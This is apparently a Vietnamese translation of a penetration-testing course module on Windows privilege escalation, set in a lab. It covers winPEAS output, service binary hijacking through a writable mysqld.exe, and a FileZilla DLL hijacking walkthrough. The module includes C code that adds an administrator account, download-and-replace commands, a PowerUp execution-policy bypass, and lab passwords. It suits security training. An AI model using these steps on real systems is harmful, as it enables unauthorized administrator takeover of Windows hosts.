        |->Groups: helpdesk,Remote Desktop Users,Users
        |->Password: CanChange-NotExpi-Req

    CLIENTWK220\daveadmin
        |->Groups: adminteam,Administrators,Remote Management Users,Users
        |->Password: CanChange-NotExpi-Req
...

    CLIENTWK220\steve
        |->Groups: helpdesk,Remote Desktop Users,Remote Management Users,Users
        |->Password: CanChange-NotExpi-Req
...
```

                                                              *Listing 38 – Thông tin user*

Output liệt kê tất cả user và group của họ theo cách dễ đọc. Cách hiển thị thông tin này giúp chúng ta rất dễ hiểu user nào tồn tại và là thành viên của các group nhất định, chẳng hạn như Remote Desktop Users.

Kéo xuống nữa, chúng ta sẽ thấy thông tin về process, service, scheduled task, thông tin mạng, và các ứng dụng đã cài đặt.

Khu vực tiếp theo chúng ta phân tích là Looking for possible password files in users homes.

```
...    
����������͹ Looking for possible password files in users homes
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\dave\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
    C:\Users\dave\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
...
```

                               *Listing 39 – Các file password khả dĩ trong thư mục home của dave*

Danh sách file không chứa asdf.txt trên Desktop của dave. Một lần nữa, chúng ta sẽ bỏ lỡ phát hiện này nếu không có thêm công việc thủ công hoặc dùng một công cụ khác.

Việc chạy winPEAS trên CLIENTWK220 đã cung cấp cho chúng ta rất nhiều thông tin và cho chúng ta một mức độ situational awareness rất tốt về hệ thống. Mặt khác, công cụ đã nhận diện sai target là Windows 10 và bỏ lỡ meeting note, PowerShell history, và transcript file, là những thứ chúng ta đã dùng để nâng quyền trong các phần trước. Tuy nhiên, vì các phát hiện bị thiếu, chúng ta không nên tránh dùng các công cụ tự động, mà chỉ cần hiểu giới hạn của chúng.

Các công cụ tự động như winPEAS là thiết yếu trong các penetration test thực tế. Bên ngoài môi trường lab, target thường chứa rất nhiều file, cấu hình, và thông tin cần xem xét. Trong khi môi trường lab chỉ có vài file, trong một assessment chúng ta có thể nhận được danh sách hàng trăm hoặc hàng nghìn file cần tìm kiếm chỉ trên một hệ thống duy nhất. Với deadline của penetration test đang đến gần, chúng ta sẽ dành toàn bộ thời gian để đi qua các file nếu không dùng các công cụ tự động.

Trong phần này, chúng ta đã làm quen với winPEAS và cách sử dụng nó. Chúng ta đã thu thập thông tin về hệ thống mục tiêu và so sánh nó với kết quả enumeration thủ công của chúng ta. Mặc dù winPEAS có một số phát hiện bị thiếu, lượng thông tin khổng lồ thu được từ việc thực thi nó cho thấy chúng ta có thể tiết kiệm được bao nhiêu thời gian để tránh phải thu thập thủ công toàn bộ các thông tin này.

---

# 2. Khai thác Windows Services

---

Learning Unit này bao gồm các Learning Objective sau:

- Hijack service binaries
- Hijack service DLLs
- Lạm dụng Unquoted service paths

Một Windows Service là một executable hoặc application chạy nền trong thời gian dài, được quản lý bởi Service Control Manager, và tương tự với khái niệm daemon trên các hệ thống Unix. Windows service có thể được quản lý thông qua Services snap-in, PowerShell, hoặc công cụ dòng lệnh `sc.exe`. Windows sử dụng các account LocalSystem (bao gồm các SID của NT AUTHORITY\SYSTEM và BUILTIN\Administrators trong token của nó), Network Service, và Local Service để chạy các service của chính hệ điều hành. User hoặc program tạo service có thể lựa chọn một trong các account này, một domain user, hoặc một local user.

Windows services là một trong những khu vực chính cần phân tích khi tìm kiếm các vector privilege escalation. Trong Learning Unit này, chúng ta sẽ xem xét ba cách khác nhau để nâng quyền bằng cách lạm dụng các service.

---

## 2.1. Service Binary Hijacking

---

Mỗi Windows service đều có một file binary tương ứng. Các file binary này sẽ được thực thi khi service được khởi động hoặc chuyển sang trạng thái đang chạy.

Trong phần này, hãy xét một kịch bản trong đó một software developer tạo ra một chương trình và cài đặt ứng dụng đó như một Windows service. Trong quá trình cài đặt, developer không bảo vệ permission của chương trình, cho phép tất cả thành viên của group Users có toàn quyền Read và Write. Kết quả là, một user có mức đặc quyền thấp hơn có thể thay thế chương trình bằng một chương trình malicious. Để thực thi binary đã bị thay thế, user có thể restart service hoặc, trong trường hợp service được cấu hình khởi động tự động, reboot máy. Khi service được khởi động lại, binary malicious sẽ được thực thi với đặc quyền của service, chẳng hạn như LocalSystem.

Chúng ta bắt đầu bằng cách kết nối tới CLIENTWK220 với tư cách dave thông qua RDP với password lab. Với mục đích của ví dụ này, giả sử rằng các vector để nâng quyền từ Learning Unit trước là ngoài phạm vi xem xét.

Để lấy danh sách tất cả các Windows service đã được cài đặt, chúng ta có thể lựa chọn nhiều phương pháp khác nhau như GUI snap-in services.msc, Cmdlet Get-Service, hoặc Cmdlet Get-CimInstance (thay thế Get-WmiObject).

Sau khi kết nối, chúng ta khởi chạy PowerShell và chọn Get-CimInstance để truy vấn lớp WMI win32_service. Chúng ta quan tâm tới name, state và path của binary cho mỗi service, do đó sử dụng Select với các tham số Name, State và PathName. Ngoài ra, chúng ta lọc bỏ các service không ở trạng thái Running bằng cách sử dụng Where-Object.

Khi sử dụng network logon như WinRM hoặc bind shell, Get-CimInstance và Get-Service sẽ trả về lỗi “permission denied” khi truy vấn service với user không có quyền quản trị. Sử dụng interactive logon như RDP sẽ giải quyết được vấn đề này.

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
...
```

                                        *Listing 40 – Danh sách service kèm đường dẫn binary*

Dựa trên output ở Listing 40, hai service của XAMPP là Apache2.4 và mysql nổi bật lên vì các binary nằm trong thư mục C:\xampp\ thay vì C:\Windows\System32. Điều này có nghĩa là service được cài đặt bởi user và developer phần mềm chịu trách nhiệm về cấu trúc thư mục cũng như permission của phần mềm. Những điều kiện này khiến service có khả năng dễ bị service binary hijacking.

Tiếp theo, hãy enumerate permission của cả hai service binary. Chúng ta có thể lựa chọn giữa công cụ Windows truyền thống icacls hoặc Cmdlet PowerShell Get-ACL. Trong ví dụ này, chúng ta sử dụng icacls vì nó có thể dùng được cả trong PowerShell lẫn Windows command line.

Tiện ích icacls hiển thị các principal tương ứng và permission mask của chúng. Các permission và mask quan trọng nhất được liệt kê bên dưới:

| Mask | Permissions |
| --- | --- |
| F | Full Access |
| M | Modify |
| RX | Read & Execute |
| R | Read |
| W | Write |

                                                      *Listing 41 – Permission mask của icacls*

Trước tiên, hãy dùng icacls với binary Apache là httpd.exe.

```
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)

Successfully processed 1 files; Failed processing 0 files
```

                                                        *Listing 42 – Permission của httpd.exe*

Với tư cách là thành viên của group Users built-in, dave chỉ có quyền Read và Execute (RX) trên httpd.exe, nghĩa là chúng ta không thể thay thế file này bằng một binary malicious.

Tiếp theo, chúng ta kiểm tra mysqld.exe của service mysql.

```
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```

                                                    *Listing 43 – Permission của mysqld.exe*

Output của Listing 43 cho thấy các thành viên của group Users có quyền Full Access (F), cho phép chúng ta ghi và chỉnh sửa binary và do đó có thể thay thế nó. Do không có chỉ báo (I) đứng trước permission này, chúng ta biết rằng permission này được đặt có chủ đích và không được kế thừa từ thư mục cha. Administrator thường đặt Full Access khi cấu hình service và không hoàn toàn chắc chắn về permission cần thiết. Việc đặt Full Access tránh được nhiều vấn đề về permission, nhưng lại tạo ra rủi ro bảo mật như chúng ta sẽ minh họa trong ví dụ này.

Hãy tạo một binary nhỏ trên Kali, dùng để thay thế mysqld.exe gốc. Đoạn mã C sau sẽ tạo một user tên dave2 và thêm user đó vào local group Administrators bằng hàm system. Phiên bản cross-compiled của đoạn mã này sẽ đóng vai trò là binary malicious của chúng ta. Hãy lưu nó trên Kali trong file tên là adduser.c.

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

                                                              *Listing 44 – Mã adduser.c*

Tiếp theo, chúng ta cross-compile đoạn mã trên máy Kali bằng mingw-64 như đã học trong Module “Fixing Exploits”. Vì chúng ta biết máy mục tiêu là 64-bit, chúng ta sẽ cross-compile mã C thành một ứng dụng 64-bit với x86_64-w64-mingw32-gcc. Ngoài ra, chúng ta dùng adduser.exe làm tham số cho -o để chỉ định tên của file thực thi đã biên dịch.

```
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

                                   *Listing 45 – Cross-compile mã C thành ứng dụng 64-bit*

Sau khi adduser.exe được cross-compile, chúng ta có thể chuyển nó sang máy mục tiêu và thay thế binary mysqld.exe gốc bằng bản sao malicious của chúng ta.

Để làm điều này, chúng ta khởi chạy một Python3 web server trong thư mục chứa adduser.exe trên Kali và dùng iwr trên máy mục tiêu trong PowerShell để tải file thực thi. Ngoài ra, chúng ta di chuyển mysqld.exe gốc vào thư mục home. Bằng cách này, chúng ta có thể khôi phục binary của service sau khi nâng quyền thành công.

```
PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

                                        *Listing 46 – Thay thế mysqld.exe bằng binary malicious*

Để thực thi binary thông qua service, chúng ta cần restart service đó. Chúng ta có thể dùng lệnh net stop để dừng service.

```
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```

                                                   *Listing 47 – Cố gắng dừng service để restart*

Không may, dave không có đủ permission để dừng service. Điều này là điều dễ hiểu vì hầu hết service chỉ được quản lý bởi user có quyền quản trị.

Vì chúng ta không có permission để restart service thủ công, chúng ta phải cân nhắc một cách tiếp cận khác. Nếu Startup Type của service được đặt là “Automatic”, chúng ta có thể restart service bằng cách reboot máy.

Hãy kiểm tra Startup Type của service mysql với sự trợ giúp của Cmdlet Get-CimInstance bằng cách chọn Name và StartMode cũng như lọc chuỗi “mysql” với Where-Object.

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto
```

                                                *Listing 48 – Lấy Startup Type của service mysql*

Listing 48 cho thấy service được đặt là Auto, nghĩa là nó sẽ tự động khởi động sau khi reboot. Để thực hiện reboot, user của chúng ta cần có privilege SeShutDownPrivilege. Chúng ta có thể dùng whoami với /priv để lấy danh sách tất cả các privilege.

```
PS C:\Users\dave> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

                                                      *Listing 49 – Kiểm tra privilege reboot*

Listing 49 cho thấy user của chúng ta có privilege cần thiết (cùng với các privilege khác) và do đó, chúng ta có thể khởi tạo shutdown hoặc reboot hệ thống. Trạng thái Disabled chỉ cho biết privilege đó hiện tại có được bật cho process đang chạy hay không. Trong trường hợp này, điều đó có nghĩa là whoami chưa yêu cầu và hiện không sử dụng SeShutdownPrivilege.

Nếu privilege SeShutdownPrivilege không tồn tại, chúng ta sẽ phải chờ nạn nhân khởi động service thủ công, điều này sẽ bất tiện hơn nhiều.

Chúng ta có thể thực hiện reboot bằng lệnh shutdown với tham số /r (reboot thay vì shutdown) và /t 0 (trong 0 giây).

*Trong một penetration test thực tế, chúng ta luôn nên tránh việc reboot các hệ thống production. Việc reboot có thể dẫn tới các vấn đề không lường trước và chỉ nên được thực hiện với sự phối hợp trực tiếp của đội IT phía khách hàng. Nếu hệ thống không khởi động lại sau khi reboot, điều này có thể làm gián đoạn hoạt động hằng ngày của khách hàng và thậm chí gây ra downtime dài hạn cho hạ tầng. Điều này đặc biệt nghiêm trọng trong trường hợp không có bản backup hiện tại.*

```
PS C:\Users\dave> shutdown /r /t 0 
```

                                                                *Listing 50 – Reboot hệ thống*

Sau khi reboot hoàn tất, chúng ta kết nối lại với tư cách dave qua RDP và mở PowerShell. Do đã reboot và Startup Type là auto, service sẽ thực thi file binary mà chúng ta đã đặt để thay thế binary mysql gốc.

Để xác nhận rằng cuộc tấn công của chúng ta đã thành công, hãy liệt kê các thành viên của local group Administrators bằng Get-LocalGroupMember để kiểm tra xem dave2 đã được tạo và thêm vào group hay chưa.

```
PS C:\Users\dave> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```

                          *Listing 51 – Hiển thị các thành viên của local group Administrators*

Listing 51 cho thấy dave2 đã được tạo và thêm vào local group Administrators. Tuyệt vời!

Giống như các phần trước, chúng ta có thể dùng RunAs để có được interactive shell. Ngoài ra, chúng ta cũng có thể dùng msfvenom để tạo một file executable khởi chạy reverse shell.

Để khôi phục trạng thái ban đầu của service, chúng ta phải xóa binary mysqld.exe của mình, khôi phục binary gốc đã backup, và reboot hệ thống.

Trước khi kết thúc phần này, hãy xem xét một công cụ tự động tên là PowerUp.ps1 và kiểm tra xem nó có phát hiện được vector privilege escalation này hay không. Để làm điều đó, chúng ta copy script này vào thư mục home của Kali và khởi chạy một Python3 web server để phục vụ nó.

```
kali@kali:~$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

           *Listing 52 – Copy PowerUp.ps1 vào home của Kali và phục vụ bằng Python3 web server*

Trên máy mục tiêu, chúng ta tải file với tư cách dave bằng iwr trong PowerShell và khởi chạy PowerShell với ExecutionPolicy Bypass. Nếu không, chúng ta sẽ không thể chạy script vì chúng bị chặn.

Sau khi import PowerUp.ps1, chúng ta có thể dùng Get-ModifiableServiceFile. Hàm này hiển thị các service mà user hiện tại có thể chỉnh sửa, chẳng hạn như binary của service hoặc file cấu hình.

```
PS C:\Users\dave> iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass
...
PS C:\Users\dave>  . .\PowerUp.ps1

PS C:\Users\dave> Get-ModifiableServiceFile

...

ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
```

                        *Listing 53 – Import PowerUp.ps1 và thực thi Get-ModifiableServiceFile*

Output của Get-ModifiableServiceFile cho thấy PowerUp đã xác định mysql (trong số các service khác) là dễ bị khai thác. Ngoài ra, nó cung cấp thông tin về đường dẫn file, principal (group BUILTIN\Users), và việc chúng ta có permission để restart service hay không (False).

PowerUp cũng cung cấp một AbuseFunction, là một hàm tích hợp để thay thế binary và, nếu có đủ permission, restart service. Hành vi mặc định là tạo một local user mới tên john với password Password123! và thêm user đó vào local group Administrators. Vì chúng ta không có đủ permission để restart service, chúng ta vẫn cần reboot hệ thống.

Tuy nhiên, nếu chúng ta dùng AbuseFunction Install-ServiceBinary với tên service, chúng ta sẽ nhận được lỗi.

```
PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'

Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
modifiable by the current user.
At C:\Users\dave\PowerUp.ps1:2178 char:13
+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
   mysql' for service mysql not modifiable by the current user.
```

                                                           *Listing 54 – Lỗi từ AbuseFunction*

Output cho biết binary của service không thể bị chỉnh sửa bởi user hiện tại. Tuy nhiên, chúng ta đã xác lập rằng mình có permission Full Access trên binary của service và đã chứng minh rằng chúng ta có thể thay thế file đó thủ công.

Khi xem xét mã nguồn của PowerUp và kiểm tra output của các lệnh được dùng trong Get-ModifiableServiceFile, chúng ta xác định rằng Get-ModifiablePath được dùng để trả về các path có thể chỉnh sửa cho user hiện tại. Tuy nhiên, trong trường hợp của chúng ta, nó trả về kết quả rỗng, dẫn đến lỗi ở trên.

Hãy phân tích hành vi này để hiểu vì sao AbuseFunction lại ném ra lỗi. Trước tiên, chúng ta thử đường dẫn binary của service mà không có tham số nào với Get-ModifiablePath. Sau đó, chúng ta thêm một tham số khác để kiểm tra xem hàm còn trả về output đúng hay không. Cuối cùng, chúng ta dùng một tham số có chứa một path bên trong.

```
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath                IdentityReference Permissions
--------------                ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath     IdentityReference                Permissions
--------------     -----------------                -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 

PS C:\Users\dave> $ModifiableFiles
```

                                              *Listing 55 – Phân tích hàm ModifiablePath*

Listing 55 cho thấy rằng trong khi service binary có hoặc không có tham số khác hoạt động như mong đợi, thì một path được dùng làm tham số lại tạo ra kết quả rỗng. Vì service mysql chỉ định tham số C:\xampp\mysql\bin\my.ini cho defaults-file trong đường dẫn binary của service hiển thị ở Listing 40, AbuseFunction đã ném ra lỗi. Trong tình huống như vậy, chúng ta nên sử dụng kết quả của service file dễ bị khai thác đã được xác định và thực hiện khai thác thủ công như đã làm trong phần này.

Cuộc điều tra của chúng ta cho thấy rằng chúng ta không bao giờ nên tin mù quáng hoặc phụ thuộc hoàn toàn vào output của các công cụ tự động. Tuy nhiên, PowerUp là một công cụ rất tốt để xác định các vector privilege escalation tiềm năng, và có thể được dùng để tự động kiểm tra xem lỗ hổng có thể bị khai thác hay không. Nếu không phải vậy, chúng ta nên thực hiện một số phân tích thủ công nếu vector tiềm năng không thực sự dễ bị khai thác hoặc AbuseFunction đơn giản là không thể khai thác được.

Trong phần này, trước hết chúng ta đã enumerate các service và permission của binary tương ứng. Sau khi xác định rằng group Users, và do đó user dave của chúng ta, có Full Access đối với binary mysqld.exe, chúng ta đã cross-compile một binary nhỏ để tạo một user quản trị tên dave2. Sau khi copy nó sang máy mục tiêu, chúng ta đã thay thế mysqld.exe bằng binary của mình. Vì không thể restart service, chúng ta cần reboot hệ thống. Sau khi hệ thống được reboot, service mysql khởi động và dave2 được tạo cũng như được thêm vào local group Administrators.

---

## 2.2. DLL Hijacking

---

Việc thay thế binary của một service là một cách rất hiệu quả để thử privilege escalation trên các hệ thống Windows. Tuy nhiên, vì user của chúng ta thường không có permission để thay thế các binary này, chúng ta sẽ cần thích nghi bằng một cách lạm dụng Windows services nâng cao hơn.

Dynamic Link Libraries (DLL) cung cấp chức năng cho các chương trình hoặc hệ điều hành Windows. DLL chứa code hoặc tài nguyên, chẳng hạn như file icon, để các file executable hoặc object khác sử dụng. Các thư viện này cung cấp cho developer một cách để dùng và tích hợp các chức năng đã tồn tại mà không phải “phát minh lại bánh xe”. Windows dùng DLL để lưu trữ chức năng cần bởi nhiều component. Nếu không, mỗi component sẽ phải có chức năng đó trong source code của riêng mình, dẫn đến lãng phí tài nguyên rất lớn. Trên các hệ thống Unix, các file này được gọi là Shared Objects.

Có nhiều phương pháp mà chúng ta có thể sử dụng để khai thác cách DLL hoạt động trên Windows và chúng thường có thể là một cách hiệu quả để nâng quyền. Một phương pháp tương tự với vector privilege escalation được thực hiện trong phần trước. Thay vì ghi đè binary, chúng ta chỉ ghi đè một DLL mà service binary sử dụng. Tuy nhiên, service hoặc application có thể không hoạt động như mong đợi vì chức năng DLL thực sự bị thiếu. Trong hầu hết các trường hợp, điều này vẫn sẽ dẫn chúng ta tới code execution của code trong DLL và sau đó, ví dụ, tới việc tạo một local administrative user mới.

Một phương pháp khác là hijack DLL search order. Search order được Microsoft định nghĩa và xác định những gì sẽ được kiểm tra trước khi tìm DLL. Theo mặc định, tất cả các phiên bản Windows hiện tại đều bật safe DLL search mode.

Thiết lập này được Microsoft triển khai do số lượng lớn các vector DLL hijacking và đảm bảo rằng DLL khó bị hijack hơn. Listing sau đây cho thấy search order tiêu chuẩn lấy từ Microsoft Documentation:

```bash
1. Thư mục mà application đã được load từ đó.
2. Thư mục system.
3. Thư mục system 16-bit.
4. Thư mục Windows.
5. Thư mục hiện tại.
6. Các thư mục được liệt kê trong biến môi trường PATH.
```

                    *Listing 56 – Standard DLL search order trên các phiên bản Windows hiện tại*

Windows trước hết tìm trong thư mục của application. Điều thú vị là current directory ở vị trí 5. Khi safe DLL search mode bị tắt, current directory được tìm ở vị trí 2 ngay sau thư mục của application.

Một trường hợp đặc biệt của phương pháp này là một DLL bị thiếu. Điều này có nghĩa là binary đã cố gắng load một DLL không tồn tại trên hệ thống. Điều này thường xảy ra với các quy trình cài đặt bị lỗi hoặc sau các bản update. Tuy nhiên, ngay cả với một DLL bị thiếu, chương trình vẫn có thể hoạt động với chức năng bị hạn chế.

Để khai thác tình huống này, chúng ta có thể thử đặt một DLL malicious (với tên của DLL bị thiếu) vào một path trong DLL search order để nó được thực thi khi binary được khởi chạy.

Hãy minh họa cách chúng ta có thể lạm dụng một DLL bị thiếu trong một ví dụ bằng cách kết nối tới CLIENTWK220 với RDP dưới user steve và password securityIsNotAnOption++++++. Chúng ta sẽ khởi chạy PowerShell và enumerate các ứng dụng đã cài đặt như đã làm trong phần trước.

```
PS C:\Users\steve> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

displayname
-----------

FileZilla 3.63.1
KeePass Password Safe 2.51.1
Microsoft Edge
Microsoft Edge Update
Microsoft Edge WebView2 Runtime

Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
```

                               *Listing 57 – Hiển thị thông tin về service đang chạy FileZilla*

Nhìn vào output từ Listing 57, chúng ta thấy rằng phiên bản 3.63.1 của ứng dụng FileZilla FTP Client hiện diện trên máy.

Theo các tài nguyên online, ứng dụng này có vẻ chứa một DLL hijacking vulnerability. Khi ứng dụng được khởi chạy, nó sẽ cố gắng load file TextShaping.dll từ thư mục cài đặt. Nếu chúng ta có thể đặt một DLL malicious tại đây thì bất cứ khi nào ai đó cố chạy FileZilla FTP Client, DLL sẽ được load với permission của user.

Trước khi tiếp tục với vulnerability này, chúng ta cần xác định xem chúng ta có thể ghi file vào thư mục FileZilla hay không.

```
PS C:\Users\steve> echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'

PS C:\Users\steve> type 'C:\FileZilla\FileZilla FTP Client\test.txt'
test
```

                                    *Listing 58 – Hiển thị permission trên binary của FileZilla*

Listing 58 cho thấy chúng ta có thể tạo file trong thư mục này với privilege hiện tại của mình.

Chúng ta có thể dùng Process Monitor để hiển thị thông tin real-time về bất kỳ hoạt động nào liên quan tới process, thread, file system, hoặc registry. Mục tiêu của chúng ta là xác định tất cả DLL được FileZilla load cũng như phát hiện DLL bị thiếu. Khi có danh sách các DLL được service binary sử dụng, chúng ta có thể kiểm tra permission của chúng và xem chúng có thể bị thay thế bằng một DLL malicious hay không. Hoặc, nếu chúng ta thấy một DLL bị thiếu, chúng ta có thể thử cung cấp DLL của riêng mình bằng cách tuân theo DLL search order.

Không may là chúng ta cần quyền quản trị để khởi chạy Process Monitor và thu thập dữ liệu này. Tuy nhiên, quy trình tiêu chuẩn trong một penetration test sẽ là copy service binary về một máy local. Trên hệ thống đó, chúng ta có thể cài service ở local và dùng Process Monitor với quyền quản trị để liệt kê toàn bộ hoạt động DLL.

Trong ví dụ này, chúng ta sẽ mô phỏng bước này bằng cách khởi chạy Process Monitor dưới user backupadmin. Chúng ta có thể duyệt Windows Explorer tới C:\tools\Procmon\ và double-click vào Procmon64.exe. Một cửa sổ sẽ hiện ra yêu cầu credential của administrative user như thể hiện trong figure sau. Khi chúng ta nhập password admin123admin123! cho backupadmin và chấp nhận điều khoản, chương trình sẽ khởi chạy.

![image.png](image%203.png)

                                                           Figure 4: Appearing Prompt for UAC

Không có filter, thông tin mà Process Monitor cung cấp có thể rất “ngợp”. Nhiều entry mới được thêm vào mỗi giây. Hiện tại, chúng ta chỉ quan tâm tới các event liên quan tới process filezilla.exe của service mục tiêu, vì vậy chúng ta có thể tạo một filter để chỉ bao gồm các event liên quan tới nó. Để làm điều này, chúng ta sẽ click vào menu Filter > Filter... để vào phần cấu hình filter.

Filter gồm bốn điều kiện. Mục tiêu của chúng ta là để Process Monitor chỉ hiển thị các event liên quan tới FileZilla Process. Chúng ta nhập các tham số sau: Process Name làm Column, is làm Relation, filezilla.exe làm Value, và Include làm Action. Khi nhập xong, chúng ta click Add.

![image.png](image%204.png)

                                                            Figure 5: Add Filter for filezilla.exe

Sau khi áp dụng filter, chúng ta sẽ thấy toàn bộ output của Procmon giờ chỉ còn giới hạn cho binary filezilla.exe. Để phân tích service binary, chúng ta nên thử xóa tất cả event hiện có bằng nút Clear.

![image.png](image%205.png)

                                                     Figure 6: Clear the current logged events

Khi event đã được xóa, chúng ta sẽ chạy ứng dụng với user hiện đang đăng nhập (steve). Kiểm tra Process Monitor sau khi ứng dụng đã được khởi chạy, chúng ta nhận thấy một số lượng lớn event đã xuất hiện.

Dựa trên cách dùng cơ bản của Procmon, chúng ta thấy rằng operation CreateFile chịu trách nhiệm không chỉ tạo file mà còn truy cập các file hiện có. Hãy thử mở rộng filter và chỉ liệt kê các CreateFile operation có chứa tên TextShaping.dll trong Path. Theo thông tin công khai về vulnerability này, DLL này được dùng để hijack execution khi FileZilla FTP Client được khởi chạy.

Hãy cập nhật filter và chỉ tìm CreateFile operation. Ngoài ra, chúng ta cũng sẽ thử giới hạn kết quả tìm kiếm bằng cách tìm đúng tên DLL cụ thể trong Path.

![image.png](image%206.png)

           *Figure 7: Add Filters looking for CreateFile operations on paths containing TextShaping.dll*

Sau khi áp dụng các filter mới, chúng ta có thể thấy số lượng event giảm đi rất nhiều. Điều chúng ta nhận thấy là các CreateFile operation liên quan tới DLL TextShaping.dll trước hết cố gắng load DLL từ application path C:\FileZilla\FileZilla FTP Client\ và thất bại với kết quả NAME NOT FOUND, cho biết rằng DLL hoàn toàn không có ở đó. Sau đó là hai CreateFile operation nữa nơi DLL được load từ System32 và dường như thành công.

![image.png](image%207.png)

                                         *Figure 8: Resulting events after applying the filters*

Cho đến hiện tại, chúng ta biết rằng ứng dụng cố định vị một file tên TextShaping.dll từ application directory trước, nhưng thất bại. Để lạm dụng điều này, chúng ta có thể thử ghi một file DLL với tên này vào application directory, là đường dẫn đầu tiên trong DLL search order. Chúng ta đã xác nhận user của mình có permission để ghi vào thư mục này, vì vậy hãy tiếp tục theo kế hoạch này.

